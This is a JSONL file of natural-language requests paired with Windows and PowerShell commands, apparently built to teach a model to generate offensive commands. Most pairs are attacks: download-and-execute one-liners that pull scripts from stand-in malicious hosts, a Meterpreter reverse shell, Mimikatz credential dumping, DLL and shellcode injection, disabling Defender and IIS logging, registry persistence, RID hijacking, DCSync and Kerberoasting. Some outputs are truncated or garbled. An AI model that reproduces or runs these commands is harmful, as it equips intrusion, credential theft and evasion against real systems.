{"input": "Copy files from a specified path to a local destination using NinjaCopy.", "output": "Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -LocalDestination 'C:\\windows\\temp;tds.dit'"}
{"input": "Invoke an Attack Tool Harness (ATH) compiled help simulation with a CHM file.", "output": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath ${chm_file_path}"}
{"input": "Execute a hidden PowerShell command to invoke a web request to a threatening site.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://threatSite.com\""}
{"input": "Invoke PowerShell Expression to download and execute a malicious script from a specific website.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.website.com/maliciouscode.ps1')\""}
{"input": "Create a new service with a specified name and binary path, then start the service.", "output": "New-Service -Name \"${service_name}\" -BinaryPathName \"${binary_path}\" ; Start-Service -Name \"${service_name}\""}
{"input": "Start a process (Web browser passview) and stop it after 5 seconds.", "output": "Start-Process ${Web_browser_passview_Path} ; Start-Sleep -Second 5 ; Stop-Process -Name \"WebBrowserPassView\""}
{"input": "Execute a hidden PowerShell command to invoke Mimikatz and dump credentials.", "output": "powershell.exe -ep bypass -NoP -NonI -W Hidden -Exec Bypass -Command ï¿½ Invoke-Mimikatz -DumpCredsï¿½"}
{"input": "Create a minidump of a specified process with ID 5121.", "output": "Out-Minidump -Process (Get-Process -Id 5121)"}
{"input": "Download and execute a malicious PowerShell script from a remote server using the -c flag.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious_site.com/malicious_script.ps1')\""}
{"input": "Download and execute a PowerShell script from a remote server on a specified IP.", "output": "Invoke-Command -ComputerName [IP] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://evil-exploit.com/exploitWin.ps1')}"}
{"input": "Query the Windows registry for values containing 'password'.", "output": "reg query HKLM /f password /t REG_SZ /s"}
{"input": "Retrieve information about the current Windows identity and save it to a file.", "output": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt"}
{"input": "Execute a specified payload with a specific data source.", "output": "${dspath} -S ${txt_payload}"}
{"input": "Enable RID Hijacking for a user named Jennifer with RID 1002 and password 'Passw'.", "output": "Invoke-RIDHijacking -User Jennifer -RID 1002 -Password Passw -Enable"}
{"input": "Execute an encoded PowerShell command with specific options.", "output": "powershell.exe -NoP -sta -NonI -W Hidden -Enc SQBFAFgAIAAACAAAABAAAAZHN0YXRlbWVud"}
{"input": "Invoke MSBuild execution on a specified computer with specific credentials.", "output": "Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -UserName 'Test.org\\Joe' -Password 'Password123!'"}
{"input": "Purge Kerberos tickets, execute a command using cmd.exe, and perform Kerberoasting with specific flags and output file.", "output": "klist purge ; cmd.exe /c \"${local_folder}${local_executable}\" kerberoast ${flags} /outfile:\"${local_folder}${out_file}\""}
{"input": "Execute a hidden PowerShell command to invoke a web request and download/execute a script from a specific site.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')\""}
{"input": "Download and execute a BOF (Binary Offset Function) payload from a specific URI.", "output": "$BOFBytes = (Invoke-WebRequest -Uri 'https://github.com/airbus-cert/Invoke-BOF/raw/main/test/test_invoke_bof.x64.o').Content; Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList 'foo', 5"}
{"input": "Download an HTA file, save it to a temporary file, execute it using mshta, wait for 15 seconds, and then stop the Calculator process.", "output": "$var =Invoke-WebRequest \"${hta_url}\" ; $var.content|out-file \"${temp_file}\" ; mshta \"${temp_file}\" ; start-sleep -s 15 ; stop-process -name \"calculator\" -Force"}
{"input": "Execute an illegal command on a remote host using PowerShell.", "output": "Invoke-Command -ComputerName <remote_host> -ScriptBlock { <illegal_command> }"}
{"input": "Mount a disk image from a specified path.", "output": "Mount-DiskImage -ImagePath \"${Path_Image}\""}
{"input": "Execute a PowerShell script from a specific file path with Bypass execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -File C:\\script.ps1"}
{"input": "Start a process (WebBrowserPassView), sleep for 3 seconds, and then stop the process.", "output": "Start-Process ${WebBrowserPassViewPath} ; Start-Sleep -Second 3 ; Stop-Process -Name \"WebBrowserPassView\""}
{"input": "Execute a PowerShell command with a base64-encoded command.", "output": "powershell.exe -encodedcommand <base64 encoded command>"}
{"input": "Invoke DCOM to start a specified service on a remote computer.", "output": "Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart 'MyService'"}
{"input": "Download and execute Mimikatz to dump credentials using a hidden PowerShell process.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Test the network connection to a specified domain and port.", "output": "Test-NetConnection -ComputerName ${domain} -port ${port}"}
{"input": "Send an email with a specific subject, sender, receiver, attachments, and SMTP server.", "output": "Send-MailMessage -From ${sender} -To ${receiver} -Subject \"T1048.003 Atomic Test\" -Attachments ${input_file} -SmtpServer ${smtp_server}"}
{"input": "Download and execute a PowerShell script from a GitHub repository to get system information.", "output": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')\""}
{"input": "Download and execute a PowerShell script from a specified server, including a secondary malicious file.", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://heavy-server.com/malware.ps1'); maliciousfile\""}
{"input": "Echo the status of User Account Control (UAC).", "output": "echo $(get-uac)"}
{"input": "Query the Windows registry for values containing 'password' in the current user's hive.", "output": "reg query HKCU /f password /t REG_SZ /s"}
{"input": "Retrieve information about installed antivirus products using Windows Management Instrumentation (WMI).", "output": "wmic /NAMESPACE:\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value"}
{"input": "Download and execute a PowerShell script from a remote server using a hidden process.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://malicious-url.com/malicious-script.ps1' | Invoke-Expression\""}
{"input": "Add a firewall rule to open a specified TCP port for incoming traffic.", "output": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=${local_port} action=allow profile=any"}
{"input": "Download and execute a PowerShell script from a specific server with a hidden process.", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malicious_script.ps1')\""}
{"input": "Configure IIS logging settings", "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"${website_name}\" /section:httplogging /dontLog:true"}
{"input": "Retrieve browser history information", "output": "Get-BrowserInformation -Browser All -Datatype History -UserName Antonio -Search 'facebook'"}
{"input": "Retrieve Windows updates information", "output": "Get-WinUpdates -ComputerName 'localhost'"}
{"input": "Dump Chrome passwords", "output": "Get-ChromeDump -OutFile '$env:HOMEPATH\\chromepwds.txt'"}
{"input": "Execute a command from a remote malicious website", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-website.com/malicious-script.ps1')\""}
{"input": "Invoke Mimikatz to dump credentials", "output": "$script = 'Invoke-Mimikatz -DumpCreds'; Invoke-Expression $script;"}
{"input": "Download content from a hidden URL", "output": "powershell -nop -w hidden -c \"$a = 'aHR0cHM6Ly9tZXNzYWdlLnBocHN1cHB'\""}
{"input": "Retrieve Group Policy Objects", "output": "Get-GPO -Domain $ENV:userdnsdomain ${gpo_p} >> ${gpo_out}"}
{"input": "Execute a PowerShell script stored on the local system", "output": "$FilePath = \"C:\\malicious_script.ps1\"; Invoke-Expression -Command $FilePath"}
{"input": "Create a minidump of a specific process", "output": "Out-Minidump -Process (Get-Process -Id 6742)"}
{"input": "Invoke Mimikatz using PowerShell", "output": "powershell.exe -ep Bypass -NoLogo -ExecutionPolicy Bypass -Command \"Invoke-Mimikatz\""}
{"input": "Download and execute a file from a remote server", "output": "Invoke-Expression -Command '$url = \"http://malware.example.com/malware.exe\"; Invoke-WebRequest -Uri $url -OutFile \"C:\\malware.exe\";'"}
{"input": "Invoke a command from a remote malicious website", "output": "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious_script.ps1')"}
{"input": "Execute a Netcat command", "output": "cmd /c ${Ncat_executable} ${IPserver} ${PortServer}"}
{"input": "Create minidump files for all running processes", "output": "Get-Process | Out-Minidump -DumpFilePath 'C:\temp'"}
{"input": "Download and execute a script from a remote website using PowerShell", "output": "Invoke-Expression -Command \"Invoke-WebRequest -Url 'http://malicious-website.com/malicious-script.ps1' | Invoke-Expression\""}
{"input": "Modify Windows Registry to execute a custom binary at startup", "output": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, ${binary_to_exe}\" -Force"}
{"input": "Set up port forwarding using netsh", "output": "netsh interface portproxy add v4tov4 listenport=${listenport} connectport=${connectport} connectaddress=${connectaddress}"}
{"input": "Execute a payload with a DLL injection", "output": "Invoke-Nightmare -DLL C:\\path\\to\\"}
{"input": "Perform credential injection and create a new Windows logon session", "output": "Invoke-CredentialInjection -DomainName 'demo' -UserName 'administrator' -Password 'Password1' -NewWinLogon"}
{"input": "Execute a specific Atomic Red Team technique", "output": "PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html"}
{"input": "Execute PowerShell command from Notepad process", "output": "$process = Get-Process -Name \"notepad.exe\" $process.StartInfo.Arguments = \"-c powershell -ep bypass -nop -w hidden -c \\\"I"}
{"input": "Write content to a file", "output": "Set-Content -Path 'msg.txt' -Value 'this machine was hacked.'"}
{"input": "Start UltraVNC Viewer process", "output": "Start-Process ${UltraVNC_Viewer_Path}"}
{"input": "Perform RID Hijacking", "output": "Invoke-RIDHijacking -UseHost -RID 1001"}
{"input": "Silently install NetSupport Manager", "output": "Start-Process ${NetSupport_Path} -ArgumentList \"/S /v/qn\""}
{"input": "Invoke Mimikatz to dump credentials", "output": "Invoke-Mimikatz -DumpCreds"}
{"input": "Invoke a method on a WMI class (Win32_Product) with specified arguments", "output": "Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${Msipayload}' }"}
{"input": "Execute a command from a remote malicious website", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script.ps1')\""}
{"input": "Invoke a command on a remote system using PowerShell", "output": "Invoke-Command -ComputerName [IP Address] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://[malicious website]/malicious.ps1')}"}
{"input": "Retrieve credentials from the Windows Credential Manager", "output": "Get-VaultCredential"}
{"input": "Perform ASREPRoast attack", "output": "cmd.exe /c \"${Local_Folder}\\${local_executable}\" asreproast /outfile:\"${Local_Folder}\\${OutFile}\""}
{"input": "Mount a disk image", "output": "Mount-DiskImage -ImagePath \"${path_of_iso}\""}
{"input": "Invoke a command on a remote system using PowerShell", "output": "Invoke-Command -ComputerName <RemoteSystemName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_url>')}"}
{"input": "Retrieve the version of Internet Explorer from the registry", "output": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version"}
{"input": "Retrieve properties of a registry key", "output": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"}
{"input": "Download a file from a remote URL using PowerShell", "output": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile ${output_file}"}
{"input": "Execute a local PowerShell script", "output": "$scriptPath = 'C:\\malicious_script.ps1'; Invoke-Expression -Command $scriptPath"}
{"input": "Invoke a command on a remote system using PowerShell", "output": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {Start-Process cmd.exe -ArgumentList \"/c <command>\"}"}
{"input": "Inject a DLL into a specific process", "output": "Invoke-DllInjection -ProcessID 4274 -Dll evil.dll"}
{"input": "Retrieve information about running processes", "output": "Get-Process"}
{"input": "Retrieve LAPS passwords from a domain controller", "output": "Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\\administrator | Export-Csv c:\temp\\output.csv -NoTypeInformation"}
{"input": "Invoke a command using PowerShell", "output": "Invoke-Command {IEX (New-Object Net.WebClient).DownloadString('http://malicious_site.com/malicious_script.ps1')}"}
{"input": "Invoke Mimikatz to dump credentials using PowerShell", "output": "powershell.exe -NoP -W Hidden -Exec Bypass -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Execute a command from a remote malicious website using PowerShell", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('https://malicious.url/malicious_script.ps1')\""}
{"input": "Execute a command from a remote malicious website using PowerShell", "output": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example-website.com/evil-script.ps1')\""}
{"input": "Perform reflective PE injection", "output": "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs \"calc.exe\""}
{"input": "Execute MSBuild on a remote system", "output": "Invoke-ExecuteMSBuild -ComputerName 'testvm.test.org' -Command IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload')"}
{"input": "Retrieve network connection information", "output": "netstat -anto; ; Get-NetTCPConnection"}
{"input": "Configure IIS logging settings", "output": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"${WebsiteName}\" /section:httplogging /dontLog:true"}
{"input": "Invoke a method on a WMI class (Win32_Product) with specified arguments", "output": "Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSI_p}' }"}
{"input": "Import a custom module and invoke Mimikatz to dump credentials", "output": "Import-Module .\\invoke-mimi.ps1; ; Invoke-Mimikatz -DumpCreds"}
{"input": "Write PowerShell version information to the console", "output": "powershell.exe -version 2 -Command Write-Host $PSVersion"}
{"input": "Retrieve and filter process information using PowerShell", "output": "$ps = get-process | select ProcessName,id; ; $valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} }; ; $valid | ConvertTo-Json"}
{"input": "Invoke a command on a remote system using PowerShell", "output": "Invoke-Command -ComputerName $target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://a-bad-url.com/abadps.ps1')}"}
{"input": "Invoke a command on a remote system using PowerShell", "output": "Invoke-Command -ComputerName <target computer> -ScriptBlock {Invoke-Expression -Command <malicious code >}"}
{"input": "Start a new PowerShell process with specific arguments", "output": "Start-Process -FilePath \"powershell.exe\" -ArgumentList '-NoP -sta -w 1 -enc [encoded command]'"}
{"input": "Invoke Mimikatz to dump credentials and execute a Meterpreter payload", "output": "Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -Lport 443"}
{"input": "Source a script and retrieve Group Policy Preferences (GPP) passwords", "output": ". ${script_path_to_get_GPPP} ; Get-GPPPassword -Verbose"}
{"input": "Retrieve and format information about the computer system using WMI", "output": "get-wmiobject win32_computersystem | fl model"}
{"input": "Encode a Mimikatz command as a Unicode payload", "output": "$payload = [System.Text.Encoding]::Unicode.GetBytes(\"Invoke-Mimikatz -DumpCreds\")"}
{"input": "Create an elevated persistence option in the Windows Registry", "output": "$ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup"}
{"input": "Various commands to retrieve user, group, and directory information", "output": "net user ; get-localuser ; get-localgroupmember -group Users ; cmdkey.exe /list ; ls C:/Users ; get-childitem C:\\Users ; dir C:\\Users ; get-localgroup ; net localgroup"}
{"input": "Execute a command from a remote malicious website using PowerShell", "output": "powershell -exec bypass -c \"IEX ((New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious-script.ps1'))\""}
{"input": "Retrieve information about security packages on the system", "output": "Get-SecurityPackages"}
{"input": "List web credentials using the VaultCmd tool", "output": "vaultcmd /listcreds:\"Web Credentials\" /all"}
{"input": "Execute a command from a remote malicious website using PowerShell", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"& {Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://very-bad-website.com/')}\""}
{"input": "Disable various Windows Defender features", "output": "Set-MpPreference -DisableRealtimeMonitoring 1 ; Set-MpPreference -DisableBehaviorMonitoring 1 ; Set-MpPreference -DisableScriptScanning 1 ; Set-MpPreference -DisableBlockAtFirstSeen 1"}
{"input": "Start a process on a remote computer", "output": "Start-Process ${RemotePC_Path}"}
{"input": "Execute a PowerShell script with specific execution policy, window style, and profile settings.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File heavy_script.ps1"}
{"input": "Download and execute a script on a remote computer using Invoke-Command and Invoke-Expression.", "output": "Invoke-Command -ComputerName 192.168.1.1 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious-site')}"}
{"input": "Retrieve information about processes, copy to clipboard, and execute from clipboard.", "output": "echo Get-Process | clip ; Get-Clipboard | iex"}
{"input": "Download and execute a script with encoded PowerShell command from a specified URL.", "output": "powershell.exe -EncodedCommand \"IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')\""}
{"input": "Download and execute a script using Invoke-Expression and WebClient.", "output": "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousURL/maliciousscript.ps1')"}
{"input": "Create a minidump for the svchost process.", "output": "Get-Process svchost | Out-Minidump"}
{"input": "Import a PowerShell module and use timestomp to modify timestamps for a file.", "output": "import-module ${path}\\timestomp.ps1 ; timestomp -dest \"${path}\\kxwn.lock\""}
{"input": "Invoke token manipulation to impersonate the 'nt authority\\system' user.", "output": "Invoke-TokenManipulation -ImpersonateUser -Username 'nt authority\\system'"}
{"input": "Execute Mimikatz to dump credentials with specific PowerShell settings.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Decode and execute a PowerShell command from a base64-encoded string.", "output": "powershell -EncodedCommand AlABAAgAEQAQABEAGgAeAB8AHwAiACMAJgAqAC4AMAAxADUAPgBFAEkATgBUAFYAW"}
{"input": "Search for domain information in the 'testlab.local' domain using Get-DomainSearcher.", "output": "Get-DomainSearcher -Domain testlab.local"}
{"input": "Execute SSH command to retrieve user identity information.", "output": "Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command 'id'"}
{"input": "Download and execute a malicious PowerShell script from a remote URL.", "output": "$url = \"http://malicious.site.com/malicious.ps1\";Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)"}
{"input": "Invoke Mimikatz tool to dump credentials from the current system.", "output": "Invoke-Expression -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Perform an Active Directory search for user objects.", "output": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()"}
{"input": "Download and execute a PowerShell script from a remote URL.", "output": "Invoke-Expression -Command \"& {$url = 'http://website.com/maliciousscript.ps1'; Invoke-WebRequest $url | Invoke-Expression}\""}
{"input": "Run a PowerShell script block on a remote computer to download and execute a script.", "output": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript')}"}
{"input": "Download and execute a PowerShell script from a remote URL.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\\hello.ps1\""}
{"input": "Run PowerShell with specific options to execute Mimikatz and dump credentials.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Mimikatz -DumpCreds}"}
{"input": "Download and execute a PowerShell script from a hidden URL.", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://dangerouswebsite.com/file.ps1')\""}
{"input": "Download and execute a PowerShell script from a remote URL.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1')\""}
{"input": "Download and execute a PowerShell script from a remote URL.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -NoLogo -NonInteractive -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')\""}
{"input": "Search for sensitive files in user directories and display the first 5 results.", "output": "Get-ChildItem C:\\Users -Recurse -Include *.${file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5; ; exit 0;"}
{"input": "Download and execute a PowerShell script from a remote URL.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://server.com/Win32.ps1');\""}
{"input": "Execute a tool or script (xordump.exe) with specified parameters.", "output": "${xordump_exe} -out ${output_file} -x 0x41"}
{"input": "Load a new in-memory PowerShell module named Win32.", "output": "$Module = New-InMemoryModule -ModuleName Win32"}
{"input": "Run a command using cmd to control Windows Defender settings.", "output": "cmd /c ${DefenderControlExe} /D ${DefenderID} | Out-Null"}
{"input": "Run a PowerShell script block on a remote computer to download and execute a script.", "output": "Invoke-Command -ComputerName <Victim IP> -ScriptBlock {IEX (New-Object Net.Webclient).DownloadString('http://malicious-server.com/malware.ps1')}"}
{"input": "Create a new item (file) and then remove it, ignoring errors if any.", "output": "New-Item -Path ${log_file} -Force | Out-Null ; Remove-Item ${log_file} -Force -ErrorAction Ignore"}
{"input": "Execute a PowerShell script from a local file.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -File exploiting.ps1"}
{"input": "Change directory to temp, then run Kerbrute to brute force user accounts against a domain controller.", "output": "cd $env:temp ; .\\kerbrute.exe bruteuser --dc ${DomainControl} -d ${Dom} $env:temp\\bruteUser.txt TestUser10"}
{"input": "Download and execute a file using PowerShell WebClient.", "output": "powershell.exe -exec bypass -c \"(New-Object System.Net.WebClient).DownloadFile('http://malicious.site/malicious.ps1')\""}
{"input": "Invoke a command to start PowerShell via cmd, launch a Tor executable, sleep for 60 seconds, and stop the Tor process.", "output": "invoke-expression 'cmd /c start powershell -Command {cmd /c ${TorExe}}' ; sleep -s 60 ; stop-process -name \"tor\" | out-null"}
{"input": "Download and execute an executable file from a remote URL, hiding the PowerShell window.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://heavy-server.site.com/evil-file.exe' -OutFile 'evil-file.exe'; Start-Process 'evil-file.exe'\""}
{"input": "Execute a PowerShell cmdlet related to Windows audio devices.", "output": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet"}
{"input": "Retrieve and format information about recorded TV items.", "output": "Get-IndexedItem -Filter \"system.kind = 'recordedTV'\" -order 'System.RecordedTV.RecordingTime' -path '\\atom-engine\\users' -recurse | format-list path,title,episodeName,programDescription"}
{"input": "Perform an LDAP search in the specified domain for user accounts with a specific account type and retrieve selected properties.", "output": "Get-DomainSearcher -Domain Pedrolprova.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'"}
{"input": "Execute a PowerShell script located at C:\\WinHack.ps1 with Bypass execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -File C:\\WinHack.ps1"}
{"input": "Execute a PowerShell script from a file with Bypass execution policy.", "output": "powershell.exe -exec bypass -File <malicious_script.ps1>"}
{"input": "Define a script containing Mimikatz command and execute it using PowerShell with Bypass execution policy.", "output": "$script = \"Invoke-Mimikatz -DumpCreds\"; powershell.exe -ExecutionPolicy Bypass -Command $script"}
{"input": "Define a command to execute the Calculator and execute it using PowerShell Invoke-Expression.", "output": "$cmd = \"C:\\Windows\\System32\\cmd.exe /c calc.exe\";Invoke-Expression -Command $cmd;"}
{"input": "Run a command using cmd to print a file with WordPad multiple times.", "output": "cmd /c \"for /l %x in (1,1,${max_to_print}) do start wordpad.exe /p ${file_to_print}\" | out-null"}
{"input": "List all Windows Credentials using vaultcmd utility.", "output": "vaultcmd /listcreds:\"Windows Credentials\" /all"}
{"input": "Invoke NetRipper to capture network traffic and log it to C:\\Temp\\ when Chrome is running and contains the search term 'SecretTerm'.", "output": "Invoke-NetRipper -LogLocation 'C:\\Temp\\' -ProcessName 'chrome' -SearchStrings 'SecretTerm'"}
{"input": "Download and execute a PowerShell script from a remote URL with Bypass execution policy.", "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/evilFail.ps1')\""}
{"input": "Invoke shellcode in the context of a specified process (ProcessId 44009).", "output": "Invoke-Shellcode -ProcessId 44009"}
{"input": "Execute rundll32.exe with specified parameters.", "output": "rundll32.exe ${InputFile}, StartW"}
{"input": "Download and execute a PowerShell script from a remote URL with Bypass execution policy.", "output": "powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example-hacker.com')\""}
{"input": "Run a PowerShell script block on a remote computer to download and execute a script.", "output": "Invoke-Command -ComputerName <remotehost> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')}"}
{"input": "Download and execute a PowerShell script from a remote URL with Bypass execution policy.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/malicious_script.ps1')\""}
{"input": "Download a PowerShell script from a remote URL and execute it.", "output": "Invoke-WebRequest -Uri 'http://malicious.site/malicious_script.ps1' -OutFile 'C:\\Users\\Public\\malicious_script.ps1'; Invoke-Expression 'C:\\Users\\Public\\malicious_script.ps1'"}
{"input": "Execute a PowerShell script from a local file with Bypass execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File malicious_script.ps1"}
{"input": "Enumerates the machines where a specific domain user/group is a member of a specific local group.", "output": "Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName , GPODisplayName , ContainerName , ComputerName"}
{"input": "Scanning for Open Ports, Scans the first 1024 ports on the local machine to check for open ports, which can be used to identify potential vulnerabilities.", "output": "1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async = $sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false); if($sock.Connected) { $_ } ; $sock.Close() }"}
{"input": "PowerShell command is to create a new PowerShell session (New-PSSession) named \"PSC\" on the remote computer with the specified name \"the.computer.name,\" and then enter that session (Enter-PSSession). This allows the user to interact with the remote computer using PowerShell commands within the created session. It's important to note that you need the necessary permissions and authentication to establish a remote PowerShell session on the specified computer.", "output": "New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC"}
{"input": "This is for an attack from child to root domain, Get child domain SID (this is the SID of the domain that has the trust relationship with the root domain)", "output": "lookupsid.py < child_domain>/username@10.10.10.10 | grep \"Domain SID\""}
{"input": "Check if any of the interesting permissions founds is realated to a username/group", "output": "Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReference -match \"RDPUsers\" }"}
{"input": "Telnet Server Until Windows10, all Windows came with a Telnet server that you could install (as administrator) doing:", "output": "pkgmgr /iu:\"TelnetServer\" /quiet"}
{"input": "Through Certify, enumerate trusted root CA certificates, certificates defined by the NTAuthCertificates object, and various information about Enterprise CAs", "output": "Certify.exe cas"}
{"input": "Bypassing Execution Policy for Script Execution, Temporarily bypasses the script execution policy to run a PowerShell script, allowing execution of unsigned scripts.", "output": "Set-ExecutionPolicy Bypass -Scope Process -Force; .\\script.ps1"}
{"input": "Retrieving Stored Credentials, Prompts for user credentials and then displays the username and password, useful for credential harvesting.", "output": "$cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password"}
{"input": "If you see the results of @@selectname, it worked", "output": "Get-SQLQuery -Instance \"sql.rto.local,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql.rto.external\", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'"}
{"input": "Port scan a host for interesting ports, Here's how to quickly port scan a specified IP address (10.10.15.232) for selected 39 interesting ports:", "output": "$ports = \"21 22 23 25 53 80 88 111 139 389 443 445 873 1099 1433 1521 1723 2049 2100 2121 3299 3306 3389 3632 4369 5038 5060 5432 5555 5900 5985 6000 6379 6667 8000 8080 8443 9200 27017\";$ip = \"10.10.15.232\";$ports.split(\" \") | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) \"Port $_ is open on $ip\"} 2>$null"}
{"input": "Logging in Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:", "output": "Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\\administrator"}
{"input": "Add-ObjectAcl cmdlet to grant the DCSync rights to a specified user (\"username\") on the Active Directory object with the distinguished name \"dc=dollarcorp,dc=moneycorp,dc=local\". This command is essentially configuring permissions to allow the specified user to perform DCSync operations on the specified Active Directory object.", "output": "Add-ObjectAcl -TargetDistinguishedName \"dc=dollarcorp,dc=moneycorp,dc=local\" -PrincipalSamAccountName username -Rights DCSync -Verbose"}
{"input": "Checks the rights on each computer with LAPS enabled for any groups with read access and users with \"All Extended Rights\"", "output": "Find-AdmPwdExtendedRights"}
